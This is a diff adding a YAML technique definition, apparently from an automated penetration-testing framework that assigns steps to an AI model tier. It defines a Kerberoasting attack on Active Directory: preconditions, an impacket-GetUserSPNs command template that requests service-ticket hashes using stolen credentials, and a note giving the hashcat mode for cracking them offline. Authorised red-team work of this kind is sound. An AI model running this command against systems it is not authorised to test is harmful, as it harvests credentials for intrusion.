@@ -1,0 +1,22 @@
+name: kerberoast
+category: ad
+description: Request TGS tickets for SPN accounts to crack offline
+preconditions:
+  - service.port==88
+  - has_cred
+  - domain_joined
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+command_template: "impacket-GetUserSPNs '{domain}/{username}:{password}' -dc-ip {target_ip} -request"
+parser: impacket_parser
+expected_effects:
+  - tgs_hashes_obtained
+  - has_hash
+falsifier:
+  pattern: "No entries found|error"
+  timeout: 45
+model_tier: haiku
+mechanism: "Requests TGS for accounts with SPNs. Service accounts often have weak passwords. Hashes are Kerberos 5 TGS-REP (hashcat -m 13100). Any domain user can request TGS for any SPN."
